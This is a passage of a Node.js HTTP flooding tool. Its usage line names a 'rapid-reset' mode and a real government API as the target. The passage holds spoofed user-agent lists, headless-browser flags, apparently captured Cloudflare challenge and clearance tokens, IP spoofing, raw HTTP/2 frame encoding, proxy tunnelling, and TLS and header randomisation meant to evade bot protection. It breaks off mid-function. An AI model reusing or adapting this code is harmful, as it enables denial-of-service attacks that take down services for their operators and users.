'Mozilla/5.0 (X11; U; Linux; ru-RU) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: 802 025a17d)',
'Mozilla/5.0 (X11; U; Linux; fi-FI) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: 754 46b659a)',
'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )',
'Mozilla/5.0 (X11; U; Linux; pt-PT) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4',
'Mozilla/5.0 (X11; U; Linux; nb-NO) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.4',
'Mozilla/5.0 (X11; U; Linux; it-IT) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: 413 12f13f8)',
'Mozilla/5.0 (X11; U; Linux; it-IT) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4',
'Mozilla/5.0 (X11; U; Linux; hu-HU) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: 388 835b3b6)',
'Mozilla/5.0 (X11; U; Linux; hu-HU) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4',
'Mozilla/5.0 (X11; U; Linux; fr-FR) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4',
'Mozilla/5.0 (X11; U; Linux; es-ES) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: 388 835b3b6)',
'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4',
'Mozilla/5.0 (X11; U; Linux; en-GB) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: 388 835b3b6)',
'Mozilla/5.0 (X11; U; Linux; en-GB) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4',
'Mozilla/5.0 (X11; U; Linux; de-DE) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4',
'Mozilla/5.0 (X11; U; Linux; cs-CZ) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: 333 41e3bc6)',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: )',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; de-DE) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: )',
'Mozilla/5.0 (Windows; U; Windows NT 5.2; pt-BR) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: )',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: )',
'Mozilla/5.0 (X11; U; Linux; en-GB) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 239 52c6958)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-BE) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)',
'Mozilla/5.0 (X11; U; Linux; sk-SK) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2 (Change: 0 )',
'Mozilla/5.0 (X11; U; Linux; nb-NO) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2 (Change: 0 )',
'Mozilla/5.0 (X11; U; Linux; es-CR) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2 (Change: 0 )',
'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2 (Change: 189 35c14e0)',
'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2 (Change: 0 )',
'Mozilla/5.0 (X11; U; Linux; de-DE) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2 (Change: 0 )',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; de-DE) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-CH) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2',
'Mozilla/5.0 (X11; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Arora/0.11.0 Safari/533.3',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.34 (KHTML, like Gecko) Arora/0.11.0 Safari/534.34',
'Mozilla/5.0 (X11; U; Linux; pl-PL) AppleWebKit/532.4 (KHTML, like Gecko) Arora/0.10.2 Safari/532.4',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Arora/0.10.2 Safari/534.34',
'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527 (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-MY) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.10.0',
'Mozilla/5.0 (Windows; U; ; hu-HU) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.10.0',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; Avant Browser; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 3.5.21022; InfoPath.2',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618; InfoPath.1',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB6.4; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; chromeframe; Avant Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; InfoPath.1; .NET CLR 3.0.4506.',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB5; Avant Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; Avant Browser; Avant Browser; .NET CLR 2.0.50727',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT; Avant Browser; Avant Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C; .NET4.0E; Avant Browser)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; Avant Browser; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; WOW64; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 3.5.21022; InfoPath.2',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; GTB6.3; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 3.5.21022; InfoPath.2',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618; InfoPath.1',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Avant Browser; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 1.1.4322; InfoPath.2',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Avant Browser; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618; InfoPath.2; OfficeLiveConnector.1.3; OfficeLivePatch.0.0',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Avant Browser; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; Tablet PC 2.0',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Avant Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727'
];

const cookie = [
"--no-sandbox",
"--disable-setuid-sandbox",
"--disable-infobars",
"--disable-logging",
"--disable-login-animations",
"--disable-notifications",
"--disable-gpu",
"--headless",
"--lang=ko_KR",
"--start-maxmized",
"--ignore-certificate-errors",
"--hide-scrollbars",
"--mute-audio",
"--disable-web-security",
"--incognito",
"--disable-canvas-aa",
"--disable-2d-canvas-clip-aa",
"--disable-accelerated-2d-canvas",
"--no-zygote",
"--use-gl=desktop",
"--disable-gl-drawing-for-tests",
"--disable-dev-shm-usage",
"--no-first-run",
"--disable-features=IsolateOrigins,site-per-process",
"--ignore-certificate-errors-spki-list",
"--user-agent=Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:107.0) Gecko/20110101 Firefox/107.0",
"?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU",
"?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU",
"?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs",
"?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA",
"?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU",
"?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs",
"?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A",
"?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA",
"?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs",
"?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA",
"?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U",
"?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU",
"?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs",
"?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA",
"?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A",
"?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs",
"?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA",
"?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU",
"?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs",
"?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA",
"?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0",
"?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh",
"?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0",
"?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0",
"?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0",
"?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U",
"?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU",
"?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU",
"?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA",
"?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk5HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU",
"?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU",
"?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs",
"?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA",
"?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A",
"?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs",
"?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs",
];

const CookieCf = cookie[Math.floor(Math.random() * cookie.length)];

// --- UTILITIES ---
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

const getCurrentTime = () => {
   const now = new Date();
   const hours = now.getHours().toString().padStart(2, '0');
   const minutes = now.getMinutes().toString().padStart(2, '0');
   const seconds = now.getSeconds().toString().padStart(2, '0');
   return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
 };

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function getRandomNumberBetween(min,max){
    return Math.floor(Math.random()*(max-min+1)+min);
}

function randomString(length) {
  var result = "";
  var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$_&-+/*!?~|•√π÷×§∆£¢€¥^°©®™✓%,.∞¥";
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  ;
  return result;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
} 

function isPrivate(ip, privateRanges) {
 if (!ip) {
   throw new Error('IP address is required');
 }
 // Fallback if ipaddr.js is missing, just return false
 if (typeof ipaddr === 'undefined') return false;
 
 if (!privateRanges || !Array.isArray(privateRanges)) {
   privateRanges = ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16'];
 }
 const ipRange = ipaddr.parse(ip);
 for (let i = 0; i < privateRanges.length; i++) {
   const range = ipaddr.parseCIDR(privateRanges[i]);
   if (ipRange.match(range)) {
     return true;
   }
 }
 return false;
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$_&-+/*!?~|•√π÷×§∆£¢€¥^°©®™✓%,.∞¥";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$_&-+/*!?~|•√π÷×§∆£¢€¥^°©®™✓%,.∞¥'; 
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

function randnum(minLength, maxLength) {
    const characters = '0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({
      length
    }, () => {
      const randomIndex = Math.floor(Math.random() * characters.length);
      return characters[randomIndex];
    });
    return randomStringArray.join('');
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

const ip_spoof = () => {
  const ip_segment = () => {
    return Math.floor(Math.random() * 255);
  };
  return `${""}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${""}`;
};

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

const urihost = [
   '35e746.dns.nextdns.io',
    'google.com',
    'dns.nextdns.io/35e746',
    'youtube.com',
    'facebook.com',
    'baidu.com',
    'wikipedia.org',
    'x.com',
    'amazon.com',
    'yahoo.com',
    'reddit.com',
    'bing.com',
    'duckduckgo.com',
    'netflix.com'
];
let clength = urihost[Math.floor(Math.random() * urihost.length)];

// --- ARGUMENTS HANDLING ---
let args = {};

if (process.argv.length >= 7) {
    // Try to use script 1 style first
    if(process.argv[2].includes('http') || process.argv[2].includes('.')) {
        args = {
            target: process.argv[2],
            time: parseInt(process.argv[3]),
            threads: parseInt(process.argv[5]), 
            proxyFile: process.argv[4],
            Rate: parseInt(process.argv[6]) || 10,
            cookieCount: 2
        };
    } else {
         args = {
            mode:  process.argv[2],
            time: parseInt(process.argv[3]),
            threads: parseInt(process.argv[4]),
            proxyFile: process.argv[5],
            Rate: parseInt(process.argv[6]),
            target: process.argv[7],
        };
    }
} else {
    console.log(`Usage: node worm.js https://api.nasa.gov/  500 proxy.txt 20 19`);
    console.log(`Or Script 1 Style: ./rapid-reset [mode] [time] [threads] [proxyfile] [rate] [target]`);
    process.exit();
}

var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var proxies = readLines(args.proxyFile);
const fakeIP = ip_spoof();
var queryString = queryStrings[Math.floor(Math.random() * queryStrings.length)];
const parsedTarget = url.parse(args.target);

// --- GLOBAL STATS ---
global.totalRequests = 0;
global.successRequests = 0;
global.blockedRequests = 0;
global.failedSockets = 0;
global.startTime = Date.now();
global.bypassData = [];

// --- NET SOCKET CLASS (ENHANCED) ---
class NetSocket {
    constructor(){}

    HTTP(options, callback) {
       const parsedAddr = options.address.split(":");
       const addrHost = parsedAddr[0];
       const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
       const buffer = new Buffer.from(payload);

       const connection = net.connect({
           host: options.host,
           port: options.port
       });

       connection.setTimeout(options.timeout * 10000);
       connection.setKeepAlive(true, 100000);

       connection.on("connect", () => {
           connection.write(buffer);
       });

       connection.on("data", chunk => {
           const response = chunk.toString("utf-8");
           const isAlive = response.includes("HTTP/1.1 200");
           if (isAlive === false) {
               connection.destroy();
               return callback(undefined, "error: invalid response from proxy server");
           }
           return callback(connection, undefined);
       });

       connection.on("timeout", () => {
           connection.destroy();
           return callback(undefined, "error: timeout exceeded");
       });

       connection.on("error", error => {
           connection.destroy();
           return callback(undefined, "error: " + error);
       });
   }

    async SOCKS5(options, callback) {
        const address = options.address.split(':');
        socks.createConnection({
          proxy: {
            host: options.host,
            port: options.port,
            type: 5
          },
          command: 'connect',
          destination: {
            host: address[0],
            port: +address[1]
          }
        }, (error, info) => {
          if (error) {
            return callback(undefined, error);
          } else {
            return callback(info.socket, undefined);
          }
        });
    }

    // StevenStore Method integrated
    createSecureConnection(proxy, callback, failCallback) {
        if (!proxy || !proxy.host || isNaN(proxy.port)) return failCallback();

        const conn = net.connect(parseInt(proxy.port), proxy.host, () => {
            let connectRequest = `CONNECT ${parsedTarget.hostname}:443 HTTP/1.1\r\nHost: ${parsedTarget.hostname}\r\n`;
            if (proxy.auth) {
                const encodedAuth = Buffer.from(proxy.auth).toString('base64');
                connectRequest += `Proxy-Authorization: Basic ${encodedAuth}\r\n`;
            }
            connectRequest += `Connection: keep-alive\r\n\r\n`;
            conn.write(connectRequest);
        });

        conn.once('data', (chunk) => {
            if (!chunk.toString().includes('200')) {
                conn.destroy();
                return failCallback();
            }
            const tlsOptionsList = [
              {
                ciphers: [
                'ECDHE-ECDSA-AES128-GCM-SHA256',
                'ECDHE-RSA-AES128-GCM-SHA256',
                'ECDHE-ECDSA-AES256-GCM-SHA384',
                'ECDHE-RSA-AES256-GCM-SHA384',
                'ECDHE-ECDSA-CHACHA20-POLY1305',
                'ECDHE-RSA-CHACHA20-POLY1305',
                'TLS_AES_128_GCM_SHA256',
                'TLS_AES_256_GCM_SHA384',
                'TLS_CHACHA20_POLY1305_SHA256',
                'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:TLS_AES_128_GCM_SHA256'
              ].join(':'),
                ecdhCurve: 'X25519:P-256:P-384:P-521',
                minVersion: 'TLSv1.3',
                maxVersion: 'TLSv1.3',
                secureOptions: crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1,
              },
              {
                ecdhCurve: 'P-256:P-384:P-521',
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                ciphers: [
                'ECDHE-ECDSA-AES128-GCM-SHA256',
                'ECDHE-RSA-AES128-GCM-SHA256',
                'ECDHE-ECDSA-AES256-GCM-SHA384',
                'ECDHE-RSA-AES256-GCM-SHA384',
                'ECDHE-ECDSA-CHACHA20-POLY1305',
                'ECDHE-RSA-CHACHA20-POLY1305',
                'TLS_AES_128_GCM_SHA256',
                'TLS_AES_256_GCM_SHA384',
                'TLS_CHACHA20_POLY1305_SHA256',
                'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:TLS_AES_128_GCM_SHA256'
              ].join(':'),
                secureOptions: crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1,
              }
            ];

            const tlsOptions = tlsOptionsList[Math.floor(Math.random() * tlsOptionsList.length)];

            const socket = tls.connect({
                socket: conn,
                servername: parsedTarget.hostname,
                ALPNProtocols: ['h2', 'http/1.1'],
                rejectUnauthorized: false,
                timeout: 400000,
                honorCipherOrder: true,
                ...tlsOptions
            }, () => callback(socket));

            socket.on('error', () => failCallback());
        });

        conn.on('error', failCallback);
        conn.on('timeout', failCallback);
   }
}

const Socker = new NetSocket();

// --- BROWSER HEADER GENERATION ---
const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx", "duckduckgo"];
const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};

const generateHeaders = (browser) => {
    const versions = {
        chrome: { min: 115, max: 125 },
        safari: { min: 14, max: 17 },
        brave: { min: 115, max: 125 },
        firefox: { min: 100, max: 115 },
        mobile: { min: 95, max: 115 },
        opera: { min: 85, max: 105 },
        operagx: { min: 85, max: 105 },
        duckduckgo: { min: 12, max: 17 }
    };

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
    const fullVersions = {
        brave: `${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(4000 + Math.random() * 1000)}.${Math.floor(100 + Math.random() * 200)}`,
        chrome: `${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(4000 + Math.random() * 1000)}.${Math.floor(100 + Math.random() * 200)}`,
        firefox: `${Math.floor(100 + Math.random() * 20)}.0`,
        safari: `${Math.floor(14 + Math.random() * 4)}.${Math.floor(0 + Math.random() * 2)}.${Math.floor(Math.random() * 100)}`,
        mobile: `${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(4000 + Math.random() * 1000)}.${Math.floor(100 + Math.random() * 200)}`,
        opera: `${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(4000 + Math.random() * 1000)}.${Math.floor(100 + Math.random() * 200)}`,
        operagx: `${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(4000 + Math.random() * 1000)}.${Math.floor(100 + Math.random() * 200)}`,
        duckduckgo: `7.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 100)}`
    };

    const secChUAFullVersionList = Object.keys(fullVersions)
        .map(key => `"${key}";v="${fullVersions[key]}"`)
        .join(", ");
    const platforms = {
        chrome: Math.random() < 0.5 ? "Win64" : Math.random() < 0.5 ? "Win32" : "Linux",
        safari: Math.random() < 0.5 ? "macOS" : Math.random() < 0.5 ? "iOS" : "iPadOS",
        brave: Math.random() < 0.5 ? "Linux" : Math.random() < 0.5 ? "Win64" : "macOS",
        firefox: Math.random() < 0.5 ? "Linux" : Math.random() < 0.5 ? "Win64" : "macOS",
        mobile: Math.random() < 0.5 ? "Android" : Math.random() < 0.5 ? "iOS" : "Windows Phone",
        opera: Math.random() < 0.5 ? "Linux" : Math.random() < 0.5 ? "Win64" : "macOS",
        operagx: Math.random() < 0.5 ? "Linux" : Math.random() < 0.5 ? "Win64" : "macOS",
